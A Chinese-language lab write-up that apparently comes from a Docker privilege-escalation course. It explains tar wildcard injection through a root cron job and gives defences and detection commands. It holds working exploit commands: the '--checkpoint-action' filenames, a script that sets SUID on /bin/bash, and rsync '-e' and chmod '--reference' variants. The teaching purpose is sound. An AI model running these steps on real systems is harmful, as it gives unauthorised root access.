# Cron 计划任务提权（tar 通配符注入）

## 原理

root 的 cron 执行 `tar czf /tmp/backup.tar.gz *`（在 /tmp/backup 目录里）。
shell 的 `*` 通配符展开后，文件名会成为 tar 的命令行参数。攻击者在目录里创建
名为 `--checkpoint=1` 和 `--checkpoint-action=exec=sh run.sh` 的文件，
tar 会把它们**当作自己的参数**解析——GNU tar 的 --checkpoint-action 可以
在打包过程中执行任意命令（以 root 身份）。

## 环境

- 基础镜像：ubuntu:20.04
- 低权限用户：lowpriv / lowpriv123
- 漏洞配置：/tmp/backup 权限 777，root cron 在其中执行 tar 通配符

## 复现步骤

利用文件已预置在容器内 /opt/exploits（属主 lowpriv，可读可写可执行），**全程在容器内操作**。

### 第一步：宿主机启动环境（仅这一步在宿主机）

```bash
cd ~/linux-privesc-lab/cron-tar-wildcard        # Kali 宿主机
docker compose up -d --build            # 构建并启动
docker exec -it cron-tar-wildcard su - lowpriv   # 进入容器 (密码 lowpriv123)
```

### 第二步：容器内确认漏洞环境

```bash
id                      # uid=1000(lowpriv) gid=1000(lowpriv)
sudo -l                 # 查看漏洞配置
ls -la /opt/exploits/   # 预置的漏洞利用文件 (源码/编译脚本/一键利用)
```

### 第三步：容器内利用（利用文件已预置在 /opt/exploits）

```bash
cd /opt/exploits

# 1. 构造恶意文件名 (tar 参数注入)
cd /tmp/backup
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh run.sh'

# 2. 写要执行的脚本
echo 'chmod u+s /bin/bash' > run.sh
chmod +x run.sh

# 3. 等待 cron 执行 (最多 65 秒)
sleep 65

# 4. 验证提权
ls -l /bin/bash
# 预期: -rwsr-xr-x 1 root root ... /bin/bash
/bin/bash -p -c 'id'
# 预期: euid=0(root)   提权成功!
```

### 一键利用（容器内）

```bash
cd /opt/exploits && bash exploit.sh
```

## 手动利用（分步教学）

### 第一步：理解漏洞本质（shell 通配符 vs 命令参数）

root 的 cron 执行：`cd /tmp/backup && tar czf /tmp/backup.tar.gz *`

shell 在**执行 tar 之前**就把 `*` 展开成了目录里的文件名。如果目录里有名为
`--checkpoint=1` 的文件，实际执行的命令变成：
```
tar czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh run.sh run.sh ...
```
tar 分不清"文件名"和"参数"——`--checkpoint-action=exec=sh run.sh` 被当成 tar 的
选项，GNU tar 会在打包每个检查点执行一次 run.sh（以 root 身份）。

这就是"通配符注入 / 参数注入"：**文件名 = 攻击者的参数**。

### 第二步：构造恶意文件

```bash
cd /tmp/backup
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh run.sh'
echo 'chmod u+s /bin/bash' > run.sh
chmod +x run.sh
```

注意 `touch --` 的 `--`：告诉 touch "后面的都是文件名"，否则 touch 会以为
--checkpoint=1 是它自己的参数。

### 第三步：等待 cron 触发

```bash
sleep 65
ls -l /bin/bash
# 预期: -rwsr-xr-x 1 root root ... /bin/bash   (SUID 已设置)
/bin/bash -p -c 'id'
# 预期: euid=0(root)
```

### 原理图解

```
cron (root) --> tar czf backup.tar.gz *
                                      |
                     shell 展开 * 为文件名（含恶意文件）--> tar 解析为参数
                                                              |
                                                              v
                                        --checkpoint-action=exec=sh run.sh
                                                              |
                                                              v
                                                run.sh 以 root 执行!
```

### 其他可利用的工具

- rsync：`-e sh x.sh` 文件名注入
- chown/chmod：`--reference=/etc/shadow` 文件名注入

### 防御

- tar 用 `-C /tmp/backup .` 代替 `*`（参数以 . 开头不会被当选项）
- 或 `tar czf out.tgz -- *` 用 `--` 结束选项解析
- root 任务工作目录不可被普通用户写

为什么能成功

`touch -- '--checkpoint=1'` 创建了以 `--` 开头的文件（`--` 让 touch 不把它当参数）。
cron 里 `tar czf /tmp/backup.tar.gz *` 展开后变成
`tar czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh run.sh ...`，
tar 解析出 --checkpoint-action 并以 root 执行 run.sh。

## 防御

- tar 命令使用绝对路径并避免通配符展开（如 `tar czf x.tar.gz /tmp/backup` 不带 *）
- root 任务的工作目录不可被普通用户写


## 扩展教学（网络搜索整理）

### 通配符注入原理图（再看一遍）

```
管理员意图: tar czf backup.tgz *        (打包目录里所有文件)
shell 实际执行: tar czf backup.tgz --checkpoint=1 --checkpoint-action=exec=sh run.sh run.sh
                                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                                 文件名被 tar 当成命令行参数!
```
**shell 的 glob 展开发生在 tar 执行之前**，tar 无法区分"文件名"与"参数"。

### 其他可利用工具（同一原理不同参数）

```bash
# 1. rsync -e 注入 (远程 shell 参数)
cd /tmp/uploads
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > x.sh
touch x.sh
touch -- '-e sh x.sh'
# 当 root cron 执行 rsync -avz * backup@host:/dest/ 时触发

# 2. chown/chmod --reference 注入
ln -s /etc/shadow shadow.link
touch -- '--reference=shadow.link'
# root 执行 chmod -R 555 * 时, 把 shadow 的权限应用到匹配文件
```

### 防御（写安全 cron 的正确姿势）

```bash
# 错误: cd /var/www/uploads && tar czf /backups/site.tgz *
# 正确1: 用 -C 锚定路径 (参数以 . 开头, 不会被当选项)
tar czf /backups/site.tgz -C /var/www/uploads .
# 正确2: 用 find + --null 传输 (文件名永不被重新解析)
find /var/www/uploads -type f -print0 | tar --null -czf /backups/site.tgz -T -
# 正确3: 用 -- 结束选项解析
tar czf /backups/site.tgz -- *
```

### 检测

```bash
# 查找可疑的"选项形"文件名
find / -name '--*' -o -name '-*' 2>/dev/null
# 监控新增 SUID 文件
find / -perm -4000 -newer /etc/hostname
```

## 验证记录

2026-08-26 真实环境验证：注入后等待 65 秒，`/bin/bash -p -c 'id'` 输出
`uid=1000(lowpriv) ... euid=0(root)`。复现成功。
